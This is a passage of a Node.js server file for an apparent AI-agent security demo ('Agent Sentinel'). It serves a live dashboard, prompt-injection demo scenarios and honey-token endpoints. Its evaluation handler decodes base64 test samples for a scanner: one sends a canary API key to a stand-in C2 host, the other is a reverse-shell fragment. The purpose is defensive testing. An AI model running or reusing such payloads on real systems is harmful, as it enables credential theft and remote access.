/**
 * Real-Time Cyber HUD & Live AI Attack Arena Server (Zero External Dependencies)
 * src/hud/server.js
 *
 * Provides:
 * - Native Node.js HTTP Server on port 3333 (or PORT env var)
 * - Server-Sent Events (SSE) live telemetry stream at /api/stream
 * - Demo Arena REST endpoints: /api/demo/run, /api/demo/verify, /api/demo/reset
 * - Evaluation and honey-token endpoints
 * - Standalone embedded Cybersecurity Command-Center Dashboard UI
 */

'use strict';

const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const { EventEmitter } = require('events');

// Sentinel core modules
let ThreatHunter = null;
let DeceptionChamber = null;
let DemoArenaHarness = null;

try {
  const hunterMod = require('../threats/hunter');
  ThreatHunter = hunterMod.ThreatHunter;
} catch (_) {}

try {
  const deceptMod = require('../threats/deception');
  DeceptionChamber = deceptMod.DeceptionChamber;
} catch (_) {}

try {
  const arenaMod = require('../demo/arena-harness');
  DemoArenaHarness = arenaMod.DemoArenaHarness;
} catch (_) {}

class CyberHudServer extends EventEmitter {
  constructor(options = {}) {
    super();
    this.port = options.port || parseInt(process.env.PORT, 10) || 3333;
    this.host = options.host || '0.0.0.0';
    this.workspaceRoot = options.workspaceRoot || process.cwd();
    this.sseClients = new Set();
    this.recentEvents = [];
    this.maxEvents = 100;

    if (ThreatHunter) {
      this.hunter = new ThreatHunter({ workspaceRoot: this.workspaceRoot });
    }
    if (DeceptionChamber) {
      this.deception = new DeceptionChamber(this.workspaceRoot);
    }
    if (DemoArenaHarness) {
      this.arena = new DemoArenaHarness({
        workspaceRoot: this.workspaceRoot,
        hunter: this.hunter,
        streamDelay: options.streamDelay !== undefined ? options.streamDelay : 35
      });

      this.arena.on('arenaEvent', (ev) => {
        this.broadcast({
          type: 'ARENA_EVENT',
          ...ev
        });
      });
    }

    this.server = null;
  }

  broadcast(eventData) {
    const payload = {
      id: Date.now(),
      timestamp: new Date().toISOString(),
      ...eventData,
    };

    this.recentEvents.unshift(payload);
    if (this.recentEvents.length > this.maxEvents) {
      this.recentEvents.pop();
    }

    const sseMessage = `data: ${JSON.stringify(payload)}\n\n`;
    for (const res of this.sseClients) {
      try {
        res.write(sseMessage);
      } catch {
        this.sseClients.delete(res);
      }
    }
  }

  async start() {
    if (this.arena) {
      await this.arena.init();
    }

    return new Promise((resolve, reject) => {
      this.server = http.createServer((req, res) => this.handleRequest(req, res));

      // Keepalive ping for SSE clients every 15s
      this.pingInterval = setInterval(() => {
        for (const client of this.sseClients) {
          try {
            client.write(': ping\n\n');
          } catch {
            this.sseClients.delete(client);
          }
        }
      }, 15000);

      this.server.on('error', reject);
      this.server.listen(this.port, this.host, () => {
        const addr = this.server.address();
        console.log(`\n  ┌─────────────────────────────────────────────────────────────┐`);
        console.log(`  │  ★ AGENT SENTINEL — LIVE AI ATTACK ARENA COMMAND CENTER     │`);
        console.log(`  ├─────────────────────────────────────────────────────────────┤`);
        console.log(`  │  Live Dashboard:   http://localhost:${addr.port}                    │`);
        console.log(`  │  Telemetry Stream: http://localhost:${addr.port}/api/stream         │`);
        console.log(`  │  Mock Network Sink: http://127.0.0.1:${this.arena ? this.arena.mockSink.port : 'armed'}            │`);
        console.log(`  │  Perimeter Status: ZERO-TRUST ENFORCING (5 PILLARS ARMED)  │`);
        console.log(`  └─────────────────────────────────────────────────────────────┘\n`);
        resolve(this);
      });
    });
  }

  async stop() {
    if (this.pingInterval) clearInterval(this.pingInterval);
    for (const client of this.sseClients) {
      try { client.end(); } catch {}
    }
    this.sseClients.clear();

    if (this.arena) {
      await this.arena.close();
    }

    return new Promise((resolve) => {
      if (this.server) {
        this.server.close(resolve);
      } else {
        resolve();
      }
    });
  }

  async handleRequest(req, res) {
    const parsed = url.parse(req.url, true);
    const pathname = parsed.pathname;

    // CORS Headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
      res.writeHead(204);
      res.end();
      return;
    }

    // 1. SSE Telemetry Stream
    if (pathname === '/api/stream' || pathname === '/api/demo/stream') {
      res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache, no-transform',
        'Connection': 'keep-alive',
      });
      res.write(': connected\n\n');
      this.sseClients.add(res);

      if (this.recentEvents.length > 0) {
        res.write(`data: ${JSON.stringify({ type: 'snapshot', events: this.recentEvents.slice(0, 15) })}\n\n`);
      }

      req.on('close', () => {
        this.sseClients.delete(res);
      });
      return;
    }

    // 2. Status API
    if (pathname === '/api/status' && req.method === 'GET') {
      const statusData = {
        version: '1.0.0',
        posture: 'ZERO-TRUST ENFORCING',
        telemetryClients: this.sseClients.size,
        workspaceRoot: this.workspaceRoot,
        honey: this.deception ? this.deception.status() : { armed: 0, tripped: 0 },
        mockSink: this.arena ? {
          port: this.arena.mockSink.port,
          receivedBytes: this.arena.mockSink.receivedBytes,
          receivedRequests: this.arena.mockSink.receivedRequests.length
        } : null,
        recentThreatsCount: this.recentEvents.filter(e => e.verdict === 'BLOCKED' || e.decision === 'BLOCKED').length,
        timestamp: new Date().toISOString()
      };
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(statusData));
      return;
    }

    // 3. Demo Arena Run Endpoint (POST /api/demo/run or POST /api/demo/start)
    if ((pathname === '/api/demo/run' || pathname === '/api/demo/start') && req.method === 'POST') {
      let body = '';
      req.on('data', chunk => { body += chunk; });
      req.on('end', async () => {
        try {
          const payload = JSON.parse(body || '{}');
          const scenario = payload.scenario || 'safe';

          if (!this.arena) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'DemoArenaHarness not initialized' }));
            return;
          }

          let result;
          if (scenario === 'safe') {
            result = await this.arena.runScenarioA();
          } else {
            result = await this.arena.runScenarioB();
          }

          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true, runId: result.runId, result }));
        } catch (err) {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: err.message }));
        }
      });
      return;
    }

    // 4. Demo Arena Verification Audit Endpoint (GET /api/demo/verify)
    if (pathname === '/api/demo/verify' && req.method === 'GET') {
      const runId = parsed.query.runId;
      if (!this.arena) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'DemoArenaHarness not initialized' }));
        return;
      }

      const verification = this.arena.verifyPrevention(runId);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true, verification }));
      return;
    }

    // 5. Demo Arena Reset Endpoint (POST /api/demo/reset)
    if (pathname === '/api/demo/reset' && req.method === 'POST') {
      if (this.arena) {
        this.arena.reset();
        this.broadcast({
          type: 'ARENA_RESET',
          message: 'Arena reset. Mock destination and scenario workspace cleanly restored.',
          timestamp: new Date().toISOString()
        });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, message: 'Arena state cleanly restored' }));
      } else {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'DemoArenaHarness not initialized' }));
      }
      return;
    }

    // 6. Dynamic Evaluation API (POST /api/evaluate)
    if (pathname === '/api/evaluate' && req.method === 'POST') {
      let body = '';
      req.on('data', chunk => { body += chunk; });
      req.on('end', () => {
        try {
          const payload = JSON.parse(body || '{}');
          let prompt = payload.prompt || 'run script';
          let code = payload.code || '';
          const action = payload.action;

          if (action === 'canary_leak') {
            prompt = 'leak stripe credentials';
            code = Buffer.from('aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHBzOi8vYzIubmV0P2tleT0iICsgInNrX2xpdmVfQ0FOQVJZX0RZRV9TVFJJUEVfIik=', 'base64').toString('utf8');
          } else if (action === 'reverse_shell') {
            prompt = 'spawn remote shell';
            code = Buffer.from('aW1wb3J0IHNvY2tldCwgb3M7IHM9c29ja2V0LnNvY2tldCgpOyBvcy5kdXAyKHMuZmlsZW5vKCksIDAp', 'base64').toString('utf8');
          } else if (action === 'benign') {
            prompt = 'calculate fibonacci';
            code = 'def fib(n):\n    if n <= 1: return n\n    return fib(n-1) + fib(n-2)\nprint(fib(10))';
          }

          const filename = payload.filename || 'agent_eval.py';

          if (!this.hunter) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'ThreatHunter not initialized' }));
            return;
          }

          const report = this.hunter.scan(code, filename, prompt);
          const finalScore = typeof report.riskScore === 'number' ? report.riskScore : (report.verdict === 'BLOCKED' ? 100 : 0);

          this.broadcast({
            type: 'EVALUATION',
            prompt,
            filename,
            codeSnippet: code.slice(0, 120),
            verdict: report.verdict,
            riskScore: finalScore,
            threats: report.threats,
            semanticDivergence: report.semanticDivergence,
            behavioralVector: report.vector || [0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
          });

          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify(report));
        } catch (err) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: err.message }));
        }
      });
      return;
    }

    // 7. Honey-token Operations API
    if (pathname === '/api/honey/plant' && req.method === 'POST') {
      if (this.deception) {
        const decoys = this.deception.plant('all');
        this.broadcast({ type: 'HONEY_PLANTED', decoys: decoys.map(d => d.type) });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, planted: decoys.length }));
      } else {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'DeceptionChamber not available' }));
      }
      return;
    }

    if (pathname === '/api/honey/clean' && req.method === 'POST') {
      if (this.deception) {
        const result = this.deception.clean();
        this.broadcast({ type: 'HONEY_CLEANED' });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(result));
      } else {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'DeceptionChamber not available' }));
      }
      return;
    }

    // 8. Serve Embedded Single-Page HTML Cyber Command Center UI
    if (pathname === '/' || pathname === '/index.html') {
      const mockPort = this.arena ? this.arena.mockSink.port : 0;
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(renderCyberHudHtml(mockPort));
      return;
    }

    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
}

function renderCyberHudHtml(mockPort = 0) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Agent Sentinel • Live AI Attack Arena</title>
  <style>
    :root {
      --bg: #090d16;
      --card-bg: rgba(15, 23, 42, 0.85);
      --border: rgba(148, 163, 184, 0.12);
      --border-glow: rgba(0, 230, 153, 0.25);
      --accent-green: #00e699;
      --accent-red: #ef4444;
      --accent-amber: #f59e0b;
      --accent-cyan: #06b6d4;
      --accent-purple: #8b5cf6;
      --text: #f1f5f9;
      --text-muted: #94a3b8;
      --text-dim: #64748b;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "JetBrains Mono", monospace;
      min-height: 100vh;
      overflow-x: hidden;
      background-image: 
        radial-gradient(circle at 12% 10%, rgba(6, 182, 212, 0.05) 0%, transparent 45%),
        radial-gradient(circle at 88% 85%, rgba(139, 92, 246, 0.05) 0%, transparent 45%),
        linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
      background-size: 100% 100%, 100% 100%, 28px 28px, 28px 28px;
    }
    header {
      padding: 1rem 2rem;
      border-bottom: 1px solid var(--border);
      display: flex;
      justify-content: space-between;
      align-items: center;
      backdrop-filter: blur(16px);
      background: rgba(9, 13, 22, 0.92);
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .logo-group { display: flex; align-items: center; gap: 0.85rem; }
    .logo-icon {
      width: 34px; height: 34px; border-radius: 8px;
      background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
      display: flex; align-items: center; justify-content: center;
      font-weight: 900; font-size: 1.15rem; color: #000;
      box-shadow: 0 0 16px rgba(6, 182, 212, 0.4);
    }
    h1 { font-size: 1.2rem; font-weight: 700; letter-spacing: 0.8px; color: #fff; }
    h1 span { color: var(--accent-green); }
    .badge {
      display: inline-flex; align-items: center; gap: 0.4rem;
      padding: 0.25rem 0.65rem; border-radius: 999px;
      font-size: 0.72rem; font-weight: 700; text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .badge-live {
      background: rgba(0, 230, 153, 0.1); border: 1px solid rgba(0, 230, 153, 0.3);
      color: var(--accent-green);
    }
    .pulse-dot {
      width: 7px; height: 7px; border-radius: 50%;
      background: var(--accent-green); box-shadow: 0 0 8px var(--accent-green);
      animation: pulse 1.6s infinite;
    }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    
    /* Control Strip */
    .arena-banner {
      background: rgba(15, 23, 42, 0.65);
      border-bottom: 1px solid var(--border);
      padding: 0.85rem 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 1rem;
    }
    .arena-controls { display: flex; align-items: center; gap: 0.75rem; }
    .btn {
      padding: 0.55rem 1.1rem;
      border-radius: 6px;
      font-size: 0.78rem;
      font-weight: 700;
      letter-spacing: 0.4px;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
      border: 1px solid transparent;
      outline: none;
    }
    .btn-green {
      background: rgba(0, 230, 153, 0.12);
      border-color: rgba(0, 230, 153, 0.4);
      color: var(--accent-green);
    }
    .btn-green:hover {
      background: var(--accent-green);
      color: #000;
      box-shadow: 0 0 16px rgba(0, 230, 153, 0.45);
    }
    .btn-red {
      background: rgba(239, 68, 68, 0.12);
      border-color: rgba(239, 68, 68, 0.4);
      color: var(--accent-red);
    }
    .btn-red:hover {
      background: var(--accent-red);
      color: #fff;
      box-shadow: 0 0 16px rgba(239, 68, 68, 0.45);
    }
    .btn-slate {
      background: rgba(148, 163, 184, 0.08);
      border-color: rgba(148, 163, 184, 0.2);
      color: var(--text-muted);
    }
    .btn-slate:hover {
      background: rgba(148, 163, 184, 0.2);
      color: #fff;
    }

    main {
      padding: 1.5rem 2rem;
      max-width: 1680px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      gap: 1.25rem;
    }

    /* 5 Pillars Status Grid */
    .pillars-grid {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 0.85rem;
    }
    @media (max-width: 1200px) { .pillars-grid { grid-template-columns: repeat(2, 1fr); } }
    @media (max-width: 700px) { .pillars-grid { grid-template-columns: 1fr; } }

    .pillar-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 0.9rem;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      gap: 0.6rem;
      transition: border-color 0.3s;
    }
    .pillar-card.active-safe {
      border-color: rgba(0, 230, 153, 0.5);
      background: rgba(0, 230, 153, 0.03);
    }
    .pillar-card.active-blocked {
      border-color: rgba(239, 68, 68, 0.5);
      background: rgba(239, 68, 68, 0.04);
    }
    .pillar-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.7rem;
      font-weight: 700;
      color: var(--text-dim);
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .pillar-name {
      font-size: 0.85rem;
      font-weight: 700;
      color: #fff;
    }
    .pillar-detail {
      font-size: 0.72rem;
      color: var(--text-muted);
      line-height: 1.35;
    }
    .pillar-badge {
      align-self: flex-start;
      padding: 0.15rem 0.45rem;
      border-radius: 4px;
      font-size: 0.68rem;
      font-weight: 700;
      text-transform: uppercase;
      background: rgba(148, 163, 184, 0.1);
      color: var(--text-muted);
    }

    /* Core Arena Layout */
    .arena-main-grid {
      display: grid;
      grid-template-columns: 360px 1fr 380px;
      gap: 1.25rem;
    }
    @media (max-width: 1300px) { .arena-main-grid { grid-template-columns: 340px 1fr; } }
    @media (max-width: 900px) { .arena-main-grid { grid-template-columns: 1fr; } }

    .card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 1.25rem;
      position: relative;
      display: flex;
      flex-direction: column;
    }
    .card-title {
      font-size: 0.82rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      color: var(--text-muted);
      margin-bottom: 1rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    /* Threat Gauge */
    .gauge-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      position: relative;
      padding: 0.5rem 0;
    }
    .gauge-svg { width: 170px; height: 170px; transform: rotate(-90deg); }
    .gauge-bg { fill: none; stroke: rgba(255, 255, 255, 0.06); stroke-width: 12; }
    .gauge-bar {
      fill: none; stroke: var(--accent-green); stroke-width: 12;
      stroke-linecap: round;
      stroke-dasharray: 440;
      stroke-dashoffset: 440;
      transition: stroke-dashoffset 0.6s ease, stroke 0.4s ease;
    }
    .gauge-val {
      position: absolute;
      text-align: center;
      font-size: 2.4rem;
      font-weight: 900;
      color: #fff;
    }
    .gauge-state {
      font-size: 0.72rem;
      font-weight: 700;
      letter-spacing: 0.5px;
      text-transform: uppercase;
      margin-top: 0.4rem;
      color: var(--accent-green);
    }

    /* Verification Box */
    .verification-box {
      margin-top: 1rem;
      background: rgba(0, 0, 0, 0.35);
      border: 1px solid rgba(0, 230, 153, 0.25);
      border-radius: 8px;
      padding: 0.85rem;
      font-size: 0.72rem;
      display: flex;
      flex-direction: column;
      gap: 0.45rem;
    }
    .verification-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .verification-tag {
      font-weight: 700;
      color: var(--accent-green);
    }

    /* Event Timeline Feed */
    .timeline-feed {
      height: 520px;
      overflow-y: auto;
      display: flex;
      flex-direction: column;
      gap: 0.65rem;
      padding-right: 0.3rem;
    }
    .timeline-feed::-webkit-scrollbar { width: 4px; }
    .timeline-feed::-webkit-scrollbar-thumb { background: rgba(148, 163, 184, 0.2); border-radius: 4px; }

    .event-card {
      background: rgba(0, 0, 0, 0.35);
      border-left: 3px solid var(--accent-cyan);
      border-radius: 0 8px 8px 0;
      padding: 0.75rem 0.9rem;
      font-size: 0.78rem;
      display: flex;
      flex-direction: column;
      gap: 0.4rem;
      transition: all 0.2s;
    }
    .event-card.blocked {
      border-left-color: var(--accent-red);
      background: rgba(239, 68, 68, 0.05);
    }
    .event-card.allow {
      border-left-color: var(--accent-green);
      background: rgba(0, 230, 153, 0.04);
    }
    .event-card-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .pillar-tag {
      font-size: 0.65rem;
      font-weight: 800;
      padding: 0.12rem 0.4rem;
      border-radius: 4px;
      background: rgba(255, 255, 255, 0.08);
      color: var(--text-muted);
    }
    .event-time { font-size: 0.65rem; color: var(--text-dim); }
    .event-msg { font-size: 0.76rem; color: #fff; line-height: 1.35; }
    
    details.evidence-box {
      margin-top: 0.3rem;
      background: rgba(0, 0, 0, 0.45);
      border: 1px solid rgba(255, 255, 255, 0.06);
      border-radius: 4px;
      padding: 0.35rem 0.5rem;
      font-size: 0.68rem;
    }
    details.evidence-box summary {
      cursor: pointer;
      color: var(--accent-cyan);
      font-weight: 700;
      user-select: none;
    }
    pre.evidence-json {
      margin-top: 0.35rem;
      font-family: monospace;
      color: #cbd5e1;
      white-space: pre-wrap;
      word-break: break-all;
    }

    /* Radar Canvas */
    .radar-wrapper { display: flex; justify-content: center; align-items: center; }
    canvas#radarCanvas { width: 100%; max-width: 360px; height: 300px; }
  </style>
</head>
<body>
  <header>
    <div class="logo-group">
      <div class="logo-icon">S</div>
      <div>
        <h1>AGENT <span>SENTINEL</span></h1>
        <div style="font-size: 0.7rem; color: var(--text-dim);">Live AI Attack Arena • Deterministic Security Verification</div>
      </div>
    </div>
    <div style="display: flex; gap: 1rem; align-items: center;">
      <div class="badge badge-live">
        <div class="pulse-dot"></div>
        <span>PERIMETER ENFORCING</span>
      </div>
      <div style="font-size: 0.72rem; color: var(--accent-cyan); font-weight: 700;">&lt;0.8ms Dynamic SLA</div>
    </div>
  </header>

  <div class="arena-banner">
    <div class="arena-controls">
      <button class="btn btn-green" id="btnSafe" onclick="runScenario('safe')">
        ▶ RUN SAFE SCENARIO A
      </button>
      <button class="btn btn-red" id="btnInjection" onclick="runScenario('injection')">
        ⚡ LAUNCH PROMPT-INJECTION ARENA B
      </button>
      <button class="btn btn-slate" id="btnReset" onclick="resetDemo()">
        ↺ RESET DEMO
      </button>
    </div>
    <div style="font-size: 0.72rem; color: var(--text-dim); display: flex; gap: 1.2rem; align-items: center;">
      <span>• Target Sink: <strong style="color: var(--accent-cyan);">127.0.0.1:${mockPort}</strong></span>
      <span>• Egress Policy: <strong style="color: var(--accent-green);">Zero External Forwarding</strong></span>
      <span>• Decision Engine: <strong style="color: #fff;">100% Dynamic (No Regex)</strong></span>
    </div>
  </div>

  <main>
    <!-- 5 Pillars Architecture Grid -->
    <div class="pillars-grid">
      <div class="pillar-card" id="cardPillar1">
        <div class="pillar-header">
          <span>Pillar 1</span>
          <span class="pillar-badge" id="badgePillar1">READY</span>
        </div>
        <div class="pillar-name">Inode & Boundary</div>
        <div class="pillar-detail" id="descPillar1">Shannon entropy, POSIX 0600 mode, and workspace topology.</div>
      </div>
      <div class="pillar-card" id="cardPillar2">
        <div class="pillar-header">
          <span>Pillar 2</span>
          <span class="pillar-badge" id="badgePillar2">READY</span>
        </div>
        <div class="pillar-name">AST & Taint Engine</div>
        <div class="pillar-detail" id="descPillar2">Dual-language syntax parsing & source-to-sink taint analysis.</div>
      </div>
      <div class="pillar-card" id="cardPillar3">
        <div class="pillar-header">
          <span>Pillar 3</span>
          <span class="pillar-badge" id="badgePillar3">READY</span>
        </div>
        <div class="pillar-name">Mirage Chamber</div>
        <div class="pillar-detail" id="descPillar3">Speculative 30ms dry-run trap & canary dye exfiltration trapping.</div>
      </div>
      <div class="pillar-card" id="cardPillar4">
        <div class="pillar-header">
          <span>Pillar 4</span>
          <span class="pillar-badge" id="badgePillar4">READY</span>
        </div>
        <div class="pillar-name">Behavioral Brain</div>
        <div class="pillar-detail" id="descPillar4">10-D radar, Markov surprise, and persistent immune memory.</div>
      </div>
      <div class="pillar-card" id="cardPillar5">
        <div class="pillar-header">
          <span>Pillar 5</span>
          <span class="pillar-badge" id="badgePillar5">READY</span>
        </div>
        <div class="pillar-name">Runtime Guards</div>
        <div class="pillar-detail" id="descPillar5">Pre-execution disarm, quarantine vault, and policy enforcement.</div>
      </div>
    </div>

    <!-- Arena Core Columns -->
    <div class="arena-main-grid">
      <!-- Left: Threat Score & Verification -->
      <div class="card">
        <div class="card-title">
          <span>Threat Policy Verdict</span>
          <span class="badge" id="verdictBadge" style="background: rgba(0,230,153,0.15); color: var(--accent-green);">SECURE</span>
        </div>
        
        <div class="gauge-wrapper">
          <svg class="gauge-svg">
            <circle class="gauge-bg" cx="85" cy="85" r="66"></circle>
            <circle class="gauge-bar" id="gaugeBar" cx="85" cy="85" r="66"></circle>
          </svg>
          <div class="gauge-val" id="riskScore">0</div>
          <div class="gauge-state" id="riskLabel">RISK SCORE: LOW</div>
        </div>

        <div class="verification-box">
          <div style="font-weight: 800; color: #fff; margin-bottom: 0.2rem; text-transform: uppercase;">Programmatic Egress Proof</div>
          <div class="verification-row">
            <span style="color: var(--text-dim);">Mock Destination:</span>
            <span style="color: #fff; font-family: monospace;">127.0.0.1:${mockPort}</span>
          </div>
          <div class="verification-row">
            <span style="color: var(--text-dim);">Packets Received:</span>
            <span class="verification-tag" id="verifPackets">0 packets</span>
          </div>
          <div class="verification-row">
            <span style="color: var(--text-dim);">Bytes Leaked to Sink:</span>
            <span class="verification-tag" id="verifBytes">0 bytes</span>
          </div>
          <div class="verification-row">
            <span style="color: var(--text-dim);">Target Secret Status:</span>
            <span class="verification-tag" id="verifSecret">CONFIDENTIAL (100% PREVENTED)</span>
          </div>
        </div>
      </div>

      <!-- Center: Real-Time Event Timeline -->
      <div class="card">
        <div class="card-title">
          <span>Security Pipeline Event Timeline</span>
          <span style="font-size: 0.7rem; color: var(--accent-cyan); font-weight: 700;">STREAMING TELEMETRY</span>
        </div>
        <div class="timeline-feed" id="eventTimeline">
          <div class="event-card">
            <div class="event-card-header">
              <span class="pillar-tag">SYSTEM</span>
              <span class="event-time">Initialization</span>
            </div>
            <div class="event-msg">Sentinel Attack Arena initialized. Ready to execute live scenario runs.</div>
          </div>
        </div>
      </div>

      <!-- Right: 10-D Behavioral Radar -->
      <div class="card">
        <div class="card-title">
          <span>10-D Behavioral Radar</span>
          <span style="font-size: 0.7rem; color: var(--text-dim);">Live Vector</span>
        </div>
        <div class="radar-wrapper">
          <canvas id="radarCanvas" width="360" height="300"></canvas>
        </div>
        <div style="margin-top: 0.8rem; font-size: 0.7rem; color: var(--text-dim); text-align: center;">
          Normalized vectors computed via AST depth, entropy, dynamic resolution, inode permissions, and Markov syscall transitions.
        </div>
      </div>
    </div>
  </main>

  <script>
    const labels = [
      'AST Depth', 'Entropy', 'KV Density', 'Secret Inode', 
      'Boundary', 'Network', 'Syscall', 'Canary Leak', 'Process', 'FD Redir'
    ];
    let currentVector = [0.08, 0.08, 0.08, 0.08, 0.08, 0.08, 0.08, 0.08, 0.08, 0.08];

    function drawRadar(vector) {
      const canvas = document.getElementById('radarCanvas');
      const ctx = canvas.getContext('2d');
      const w = canvas.width;
      const h = canvas.height;
      const cx = w / 2;
      const cy = h / 2;
      const r = Math.min(cx, cy) - 32;
      const numPoints = labels.length;

      ctx.clearRect(0, 0, w, h);

      for (let level = 1; level <= 4; level++) {
        ctx.beginPath();
        const curR = (r / 4) * level;
        for (let i = 0; i < numPoints; i++) {
          const angle = (Math.PI * 2 / numPoints) * i - Math.PI / 2;
          const x = cx + curR * Math.cos(angle);
          const y = cy + curR * Math.sin(angle);
          if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
        }
        ctx.closePath();
        ctx.strokeStyle = 'rgba(255, 255, 255, 0.07)';
        ctx.stroke();
      }

      ctx.font = '9px monospace';
      ctx.fillStyle = '#64748b';
      ctx.textAlign = 'center';
      for (let i = 0; i < numPoints; i++) {
        const angle = (Math.PI * 2 / numPoints) * i - Math.PI / 2;
        const x = cx + r * Math.cos(angle);
        const y = cy + r * Math.sin(angle);
        ctx.beginPath(); ctx.moveTo(cx, cy); ctx.lineTo(x, y);
        ctx.strokeStyle = 'rgba(6, 182, 212, 0.12)'; ctx.stroke();

        const lx = cx + (r + 16) * Math.cos(angle);
        const ly = cy + (r + 16) * Math.sin(angle) + 3;
        ctx.fillText(labels[i], lx, ly);
      }

      ctx.beginPath();
      for (let i = 0; i < numPoints; i++) {
        const val = Math.max(0.08, Math.min(1.0, vector[i] || 0.08));
        const angle = (Math.PI * 2 / numPoints) * i - Math.PI / 2;
        const x = cx + (r * val) * Math.cos(angle);
        const y = cy + (r * val) * Math.sin(angle);
        if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
      }
      ctx.closePath();
      ctx.fillStyle = 'rgba(6, 182, 212, 0.25)'; ctx.fill();
      ctx.strokeStyle = '#06b6d4'; ctx.lineWidth = 2; ctx.stroke();
    }

    function updateRiskScore(score, isBlocked) {
      const bar = document.getElementById('gaugeBar');
      const scoreEl = document.getElementById('riskScore');
      const labelEl = document.getElementById('riskLabel');
      const badgeEl = document.getElementById('verdictBadge');

      const validScore = Number.isFinite(score) ? score : (isBlocked ? 100 : 0);
      const maxOffset = 440;
      const progress = (validScore / 100) * (maxOffset * 0.75);
      bar.style.strokeDashoffset = maxOffset - progress;
      scoreEl.textContent = Math.round(validScore);

      if (validScore >= 80 || isBlocked) {
        bar.style.stroke = 'var(--accent-red)';
        scoreEl.style.color = 'var(--accent-red)';
        labelEl.textContent = 'PROHIBITED OPERATION BLOCKED';
        labelEl.style.color = 'var(--accent-red)';
        badgeEl.textContent = 'BLOCKED (CRITICAL)';
        badgeEl.style.background = 'rgba(239, 68, 68, 0.2)';
        badgeEl.style.color = 'var(--accent-red)';
      } else if (validScore >= 50) {
        bar.style.stroke = 'var(--accent-amber)';
        scoreEl.style.color = 'var(--accent-amber)';
        labelEl.textContent = 'SUSPICIOUS ESCALATION';
        labelEl.style.color = 'var(--accent-amber)';
        badgeEl.textContent = 'ELEVATED RISK';
        badgeEl.style.background = 'rgba(245, 158, 11, 0.2)';
        badgeEl.style.color = 'var(--accent-amber)';
      } else {
        bar.style.stroke = 'var(--accent-green)';
        scoreEl.style.color = '#fff';
        labelEl.textContent = 'SAFE OPERATION COMPLETED';
        labelEl.style.color = 'var(--accent-green)';
        badgeEl.textContent = 'ALLOWED (SECURE)';
        badgeEl.style.background = 'rgba(0, 230, 153, 0.15)';
        badgeEl.style.color = 'var(--accent-green)';
      }
    }

    function updatePillarCard(pillarNum, state, descText) {
      const card = document.getElementById('cardPillar' + pillarNum);
      const badge = document.getElementById('badgePillar' + pillarNum);
      const desc = document.getElementById('descPillar' + pillarNum);
      if (!card || !badge) return;

      card.classList.remove('active-safe', 'active-blocked');
      if (state === 'BLOCKED') {
        card.classList.add('active-blocked');
        badge.textContent = 'INTERCEPTED';
        badge.style.background = 'rgba(239, 68, 68, 0.2)';
        badge.style.color = 'var(--accent-red)';
      } else if (state === 'ALLOW') {
        card.classList.add('active-safe');
        badge.textContent = 'PERMITTED';
        badge.style.background = 'rgba(0, 230, 153, 0.2)';
